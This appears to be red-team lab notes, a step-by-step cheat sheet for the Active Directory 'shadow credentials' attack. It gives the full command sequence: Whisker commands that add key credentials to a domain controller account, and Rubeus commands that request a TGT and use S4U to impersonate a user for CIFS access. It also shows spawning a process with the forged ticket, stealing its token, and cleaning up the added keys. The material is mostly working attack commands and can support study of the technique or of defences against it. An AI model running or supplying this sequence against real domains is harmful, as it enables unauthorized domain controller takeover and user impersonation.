> The basis of the "shadow credentials" attack is that if you can write to this attribute on a user or computer object, you can obtain a TGT for that principal

# First we want to list any kyes that might already be present on target

```bash
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
```

# Add a new pair of keys to the target

```bash
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$
```

# Use the command presented to get a TGT for that account

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA[...snip...]ICB9A= /password:"y52EhYqlfgnYPuRb" /nowrap
```

# Use s4uself technique to impersonate a user on our liking

```bash
# s4uslef & s4uselfproxie will run
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

# Grab the second ticket and start a process
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# Steal token from previous process
steal_token 2664
```

# When we are finished we can clean the stored keys

```bash
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:<id-here>
```
